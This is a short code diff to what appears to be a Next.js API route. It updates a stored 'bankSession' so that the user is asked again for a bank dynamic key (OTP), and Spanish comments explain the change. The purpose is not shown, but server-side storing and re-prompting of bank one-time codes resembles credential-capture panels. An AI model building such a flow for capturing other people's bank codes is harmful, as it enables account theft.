@@ -31,9 +31,9 @@ export async function POST(request: NextRequest) {
         const updatedSession = await prisma.bankSession.update({
           where: { sessionId },
           data: { 
-            status: 'request_otp_again',
+            status: 'waiting_otp', // Cambiar a waiting_otp para que se abra el modal
             claveDinamica: null,
-            dinamicaIncorrecta: true
+            dinamicaIncorrecta: false // No marcar como incorrecta, solo solicitar de nuevo
           }
         });
         
